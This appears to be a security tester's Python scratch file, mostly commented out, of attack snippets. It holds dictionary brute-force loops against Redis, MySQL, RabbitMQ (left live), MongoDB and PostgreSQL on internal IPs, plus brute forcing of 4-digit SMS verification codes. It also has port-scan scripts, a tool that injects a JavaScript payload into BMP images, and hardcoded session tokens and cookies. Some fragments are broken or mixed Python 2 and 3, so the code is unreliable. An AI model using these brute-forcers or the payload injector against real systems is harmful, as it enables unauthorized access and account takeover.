# # #-*- coding: UTF-8 -*-
# #
# # # # # # # # import requests
# # # # # # # # import json
# # # # # # # # import time
# # # # # # # # print(time.time())
# # # # # # # # # for i in range(17665342186,18665342190):
# # # # # # # # #     i=str(i)
# # # # # # # # #     r=requests.get("http://111.6.121.33:38083/api/smscode/"+i)
# # # # # # # # #     t=str(r.text)
# # # # # # # # #     t=json.loads(t)
# # # # # # # # #     code=str(t['code'])
# # # # # # # # #
# # # # # # # # #     url = "http://"
# # # # # # # # #
# # # # # # # # #     payload = "{\"smscode\":\""+code+"\",\"username\":\"17665342190\",\"randomStr\":\"5ffa1943ed6b4217b5d47ca5998c38cd\"}"
# # # # # # # # #     headers = {
# # # # # # # # #       'Content-Type': 'application/json'
# # # # # # # # #     }
# # # # # # # # #
# # # # # # # # #     response = requests.request("POST", url, headers=headers, data = payload)
# # # # # # # # #
# # # # # # # # #     print(i,response.text)
# # # # # # # #
# # # # # # # #
# # # # # # # # data='''{{"address":"{task_target}","description":"{task_targetinfo}","criticality":"10"}}'''.format(task_target=task_target,task_targetinfo=task_targetinfo)
# # # # # # # # print(data)
# # # # # # #
# # # # # # #
# import redis
# for ip in ['']:
#     for pa in ["123456","","password","passwd","12345678","admin","cmcc","cmcc123","cmcc123456","123",'12345','123456a','5201314','111111','woaini1314','qq123456','123123','0','1qaz2wsx','1q2w3e4r','qwe123','7758521','123qwe','a123123','123456aa','woaini520','woaini','100200','1314520','woaini123','123321','q123456','123456789','123456789a','5211314','asd123','a123456789','z123456','asd123456','a5201314','aa123456','zhang123','88888888','aptx4869','123123a','1q2w3e4r5t','1qazxsw2','5201314a','1q2w3e','aini1314','31415926','q1w2e3r4','123456qq','woaini521','1234qwer','a111111','520520','iloveyou','abc123','110110','111111a','123456abc','w123456','7758258','123qweasd','159753','qwer1234','a000000','qq123123','zxc123','123654','abc123456','123456q','qq5201314','1234567','000000a','456852','as123456','1314521','112233','521521','qazwsx123','zxc123456','abcd1234','asdasd','666666','love1314','QAZ123','aaa123','q1w2e3','aaaaaa','a123321','123000','11111111','12qwaszx','5845201314','s123456','nihao123','caonima123','zxcvbnm123','wang123','159357','1A2B3C4D','asdasd123','584520','753951','147258','1123581321','110120','qq1314520','cmcc12345','cmcc1234','cmcc123','cmcc123','123','1234','1234567890','0123456789']:
#         try:
#             r = redis.Redis(host=ip,port=6379,password=pa, db=0)
#             if pa=="":
#                 pa="无口令"
#             print(r.dbsize(),ip,pa)
#             break
#         except:
#             pass
# # # # # #
# # # # # #
# # # # # # import nmap,time
# # # # # # import sqlite3
# # # # # # nm = nmap.PortScanner()
# # # # # # conn = sqlite3.connect('/usr/local/SecurityManageFramwork/db.sqlite3')
# # # # # # cursor = conn.cursor()
# # # # # # sql="select asset_id,ip,status,create_time from Port_scan where status='create';"
# # # # # # cursor.execute(sql)
# # # # # #
# # # # # # for i in cursor:
# # # # # #     asset_id=i[0]
# # # # # #     ip=i[1]
# # # # # #     result=nm.scan(ip, '80,21,22,23,25,53,110,443,445,888,1433,1863,2289,3306,5631,5632,5000,8080,9090', '-sV')
# # # # # #     try:
# # # # # #         re=result['scan'][ip]['tcp']
# # # # # #     except:
# # # # # #         re=""
# # # # # #     for port in re:
# # # # # #         k=result['scan'][ip]['tcp'][port]
# # # # # #         #print(k)
# # # # # #         if "open" in str(k):
# # # # # #             print(port,k)
# # # # # #     sql="UPDATE Port_scan set status='{}',result='{}' where asset_id='{}';".format("close",re,asset_id)
# # # # # #         # cursor.execute(sql)
# # # # # #         # conn.commit()
# # # # # #
# # # # # # import requests
# # # # # # headers = {
# # # # # #       'token': 'UvuNudE3YhZywww0',
# # # # # #     'Content-Type':'application/json;charset=UTF-8',
# # # # # #     'Origin': 'http://192.168.105.62:8075',
# # # # # #     'usertype': 'null',
# # # # # #     'Accept': 'application/json, text/plain, */*',
# # # # # #     'Accept-Encoding':'gzip, deflate',
# # # # # #     'Accept-Language': 'zh-CN,zh;q=0.9',
# # # # # #     'Connection': 'keep-alive',
# # # # # #     'Content-Length': '2',
# # # # # #     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
# # # # # # }
# # # # # #
# # # # # # response = requests.post("http://192.168.105.61:8089/controlLib/list?pageSize=10&pageNum=1", headers=headers,data={})
# # # # # # print(response.text)
# # # # #
# # # # #
# # # # # # import os
# # # # # # import argparse
# # # # # #
# # # # # #
# # # # # # def injectFile(payload, fname):
# # # # # #     f = open(fname, "r+b")
# # # # # #     b = f.read()
# # # # # #     f.close()
# # # # # #
# # # # # #     f = open(fname, "w+b")
# # # # # #     f.write(b)
# # # # # #     f.seek(2, 0)
# # # # # #     f.write(b'\x2F\x2A')
# # # # # #     f.close()
# # # # # #
# # # # # #     f = open(fname, "a+b")
# # # # # #     f.write(b'\xFF\x2A\x2F\x3D\x31\x3B')
# # # # # #     f.write(payload)
# # # # # #     f.close()
# # # # # #     return True
# # # # # #
# # # # # #
# # # # # # if __name__ == "__main__":
# # # # # #     parser = argparse.ArgumentParser()
# # # # # #     parser.add_argument("filename", help="the bmp file name to infected")
# # # # # #     parser.add_argument("js_payload", help="the payload to be injected. For exampe: \"alert(1);\"")
# # # # # #     args = parser.parse_args()
# # # # # #     injectFile(args.js_payload, args.filename)
# # # # #
# # # # #
# from kazoo.client import KazooClient
#
# zk = KazooClient(hosts='192.')
# zk.start()
# # 获取某个节点下所有子节点
# node = zk.get_children('/')
# # 获取某个节点对应的值
#
# # 操作完后，别忘了关闭zk连接
# zk.stop()
# print(node)

# # # # # #
# # # # import pymysql
# # # # for pa in ["123456","","root","password","passwd","12345678","admin","cmcc","cmcc1234","cmcc123","cmcc123456","123",'a123456','123456a','5201314','111111','woaini1314','qq123456','123123','0','1qaz2wsx','1q2w3e4r','qwe123','7758521','123qwe','a123123','123456aa','woaini520','woaini','100200','1314520','woaini123','123321','q123456','123456789','123456789a','5211314','asd123','a123456789','z123456','asd123456','a5201314','aa123456','zhang123','aptx4869','123123a','1q2w3e4r5t','1qazxsw2','5201314a','1q2w3e','aini1314','31415926','q1w2e3r4','123456qq','woaini521','1234qwer','a111111','520520','iloveyou','abc123','110110','111111a','123456abc','w123456','7758258','123qweasd','159753','qwer1234','a000000','qq123123','zxc123','123654','abc123456','123456q','qq5201314','12345678','000000a','456852','as123456','1314521','112233','521521','qazwsx123','zxc123456','abcd1234','asdasd','666666','love1314','QAZ123','aaa123','q1w2e3','aaaaaa','a123321','123000','11111111','12qwaszx','5845201314','s123456','nihao123','caonima123','zxcvbnm123','wang123','159357','1A2B3C4D','asdasd123','584520','753951','147258','1123581321','110120','qq1314520']:
# # # #     try:
# # # #         db = pymysql.connect("192.168.105.243", "root", pa,port=32775)
# # # #         print("                                                             密码是：",pa)
# # # #     except:
# # # #         pass
# # # # # #
# # # # # # import re
# # # # # # a="202001010000-202012010000/天"
# # # # # # d="天"
# # # # # # m = re.findall("\d{12}", a)
# # # # # # if "/时" in a:
# # # # # #     d="时"
# # # # # # elif "/天" in a:
# # # # # #     d="天"
# # # # # # elif "/月" in a:
# # # # # #     d="月"
# # # # # # elif "/年" in a:
# # # # # #     d="年"
# # # # # # print(m)
# # # # #
# # # # #
# # # # # import requests
# # # # #
# # # # # url = "hnd2"
# # # # # for i in range(0000,9999):
# # # # #     payload="emphone=19801656010&code="+str(i)+"&unionid=null"
# # # # #     headers = {
# # # # #       'Host': 'jcn:8084',
# # # # #       'Connection': 'keep-alive',
# # # # #       'Content-Length': '42',
# # # # #       'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36 MicroMessenger/7.0.9.501 NetType/WIFI MiniProgramEnv/Windows WindowsWechat',
# # # # #       'content-type': 'application/x-www-form-urlencoded',
# # # # #       'officeZone': '',
# # # # #       'openid': 'o78r74rVkull7Lj24mYu30NAV_Ww',
# # # # #       'Referer': 'https://servicewechat.com/wxe58649eb4216c254/20/page-frame.html',
# # # # #       'Accept-Encoding': 'gzip, deflate, br'
# # # # #     }
# # # # #
# # # # #     response = requests.request("POST", url, headers=headers, data=payload)
# # # # #
# # # # #     print(response.text,i)
# # # # # import os
# # # # # print(os.getcwd())
# # # # # import requests
# # # # # m=1
# # # # # for i in range(1,m+1):
# # # # #     print(i)
# # #
# # # # import random
# # # # print( random.randint(-211,210) )
# # #
# # # import requests
# # #
# # # url = "he=1"
# # #
# # # payload={}
# # # headers = {
# # #   'Accept': 'application/json, text/plain, */*',
# # #   'Accept-Encoding': 'gzip, deflate, br',
# # #   'Accept-Language': 'zh-CN,zh;q=0.9',
# # #   'Connection': 'keep-alive',
# # #   'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
# # #   'Cookie': 'csrftoken=3vanz14lSv9jUen4wNqEJZA8JejnZgHi5cdDWuxG0hT655CNQtcSpbCYQ3AFlkHU',
# # #   'DNT': '1',
# # #   'Host': '1',
# # #   'Referer': 'htt',
# # #   'Sec-Fetch-Dest': 'empty',
# # #   'Sec-Fetch-Mode': 'cors',
# # #   'Sec-Fetch-Site': 'same-origin',
# # #   'timesign': 'a63490affe451a3827fe51d1cf151f0d',
# # #   'timestamp': '1614914054096',
# # #   'token': '70dc76f5-a137-44db-8802-e0399a2bdabc',
# # #   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
# # #   'x-requested-with': 'XMLHttpRequest;'
# # # }
# # #
# # # response = requests.request("GET", url, headers=headers, data=payload,verify=False)
# # #
# # # # print(response.text)
# # #
# # # #
import pika
for pa in ["123456","","password","passwd","12345678","admin","cmcc","cmcc123","cmcc123456","123",'12345','123456a','5201314','111111','woaini1314','qq123456','123123','0','1qaz2wsx','1q2w3e4r','qwe123','7758521','123qwe','a123123','123456aa','woaini520','woaini','100200','1314520','woaini123','123321','q123456','123456789','123456789a','5211314','asd123','a123456789','z123456','asd123456','a5201314','aa123456','zhang123','88888888','aptx4869','123123a','1q2w3e4r5t','1qazxsw2','5201314a','1q2w3e','aini1314','31415926','q1w2e3r4','123456qq','woaini521','1234qwer','a111111','520520','iloveyou','abc123','110110','111111a','123456abc','w123456','7758258','123qweasd','159753','qwer1234','a000000','qq123123','zxc123','123654','abc123456','123456q','qq5201314','1234567','000000a','456852','as123456','1314521','112233','521521','qazwsx123','zxc123456','abcd1234','asdasd','666666','love1314','QAZ123','aaa123','q1w2e3','aaaaaa','a123321','123000','11111111','12qwaszx','5845201314','s123456','nihao123','caonima123','zxcvbnm123','wang123','159357','1A2B3C4D','asdasd123','584520','753951','admin','1123581321','110120','qq1314520','cmcc12345','cmcc1234','cmcc123','cmcc123','123','1234','1234567890','0123456789']:
#建立连接
    try:
        ip=""
        userx=pika.PlainCredentials("admin",pa)
        conn=pika.BlockingConnection(pika.ConnectionParameters(ip,5672,'/',credentials=userx))

        #开辟管道
        channelx=conn.channel()
        print(pa,ip)
    except:
        continue
# #
# # # # !/usr/bin/python3
# # #
# import pymongo
# for pa in ["123456","","root","password","passwd","mongodb","12345678","admin","cmcc","cmcc1234","cmcc123","cmcc123456","123",'a123456','123456a','5201314','111111','woaini1314','qq123456','123123','0','1qaz2wsx','1q2w3e4r','qwe123','7758521','123qwe','a123123','123456aa','woaini520','woaini','100200','1314520','woaini123','123321','q123456','123456789','123456789a','5211314','asd123','a123456789','z123456','asd123456','a5201314','aa123456','zhang123','aptx4869','123123a','1q2w3e4r5t','1qazxsw2','5201314a','1q2w3e','aini1314','31415926','q1w2e3r4','123456qq','woaini521','1234qwer','a111111','520520','iloveyou','abc123','110110','111111a','123456abc','w123456','7758258','123qweasd','159753','qwer1234','a000000','qq123123','zxc123','123654','abc123456','123456q','qq5201314','12345678','000000a','456852','as123456','1314521','112233','521521','qazwsx123','zxc123456','abcd1234','asdasd','666666','love1314','QAZ123','aaa123','q1w2e3','aaaaaa','a123321','123000','11111111','12qwaszx','5845201314','s123456','nihao123','caonima123','zxcvbnm123','wang123','159357','1A2B3C4D','asdasd123','584520','753951','147258','1123581321','110120','qq1314520','adminPass']:
#     try:
#         myclient = pymongo.MongoClient('mongodb://admin:'+pa+'@192.168.105.80:27017/')
#
#         dblist = myclient.list_database_names()
#
#         print(pa,dblist)
#     except:
#         pass
# #
# # import html2text
# # # Ignore converting links from HTML
# # h = html2text.HTML2Text()
# # h.ignore_links = True
# # import re
# # h = html2text.HTML2Text()
# # h.ignore_links = True
# # print(h.handle(aaa))
#
#
# # !/usr/bin/python3
# import pymysql
# import masscan
# def masscan():
#     masscan = masscan.PortScanner()
#     ip="192.168.."
#     ports="1-10000"
#     res=masscan.scan(ip,ports,arguments='--max-rate 10000')
#     for i in res["scan"]:
#         ports=res["scan"][i]["tcp"]
#         for port in ports:
#             print i,port
#
# def read_mysql():
#     db = pymysql.connect("localhost", "testuser", "test123", "TESTDB")
#     cursor = db.cursor()
#     sql = "SELECT * FROM EMPLOYEE \
#            WHERE INCOME > %s" % (1000)
#     cursor.execute(sql)
#     results = cursor.fetchall()
#     for row in results:
#         print(row)
#
# def write_mysql(ip,port):
#     db = pymysql.connect("", "root", "mima!", "vuln")
#     cursor = db.cursor()
#     sql = "INSERT INTO weakpw_ip_protocol(ip,port) VALUES ("+ip+","+str(port)+")"
#     cursor.execute(sql)
#     db.commit()
#     db.close()
# try:
#     1
# except

#
# import memcache
# mc = memcache.Client(["192.168.106.7:11211"],debug=True)
# #
# username = mc.get_stats()
# print(username)


# 导入依赖包
# !/usr/bin/python3

# import psycopg2
#
# # 创建连接对象
# for i in ['192.168.105.14','192.168.105.48','192.168.105.76','192.168.106.163','192.168.106.31']:
#     for pa in ["123456", "", "root", "password", "passwd", "12345678", "admin", "cmcc", "cmcc1234", "cmcc123",
#                "cmcc123456", "123", 'a123456', '123456a', '5201314', '111111', 'woaini1314', 'qq123456', '123123', '0',
#                '1qaz2wsx', '1q2w3e4r', 'qwe123', '7758521', '123qwe', 'a123123', '123456aa', 'woaini520', 'woaini',
#                '100200', '1314520', 'woaini123', '123321', 'q123456', '123456789', '123456789a', '5211314', 'asd123',
#                'a123456789', 'z123456', 'asd123456', 'a5201314', 'aa123456', 'zhang123', 'aptx4869', '123123a',
#                '1q2w3e4r5t', '1qazxsw2', '5201314a', '1q2w3e', 'aini1314', '31415926', 'q1w2e3r4', '123456qq',
#                'woaini521', '1234qwer', 'a111111', '520520', 'iloveyou', 'abc123', '110110', '111111a', '123456abc',
#                'w123456', '7758258', '123qweasd', '159753', 'qwer1234', 'a000000', 'qq123123', 'zxc123', '123654',
#                'abc123456', '123456q', 'qq5201314', '12345678', '000000a', '456852', 'as123456', '1314521', '112233',
#                '521521', 'qazwsx123', 'zxc123456', 'abcd1234', 'asdasd', '666666', 'love1314', 'QAZ123', 'aaa123',
#                'q1w2e3', 'aaaaaa', '1234', '12345', '1234567', 'a123321', '123000', '11111111', '12qwaszx', '5845201314', 's123456', 'nihao123','caonima123', 'zxcvbnm123', 'wang123', '159357', '1A2B3C4D', 'asdasd123', '584520', '753951', '147258',
#                '1123581321', '110120', 'qq1314520', 'adminPass']:
#         try:
#             conn = psycopg2.connect(database="postgres", user="postgres", password=pa, host=i, port="5432")
#             print(i,pa)
#             break
#         except:
#             continue
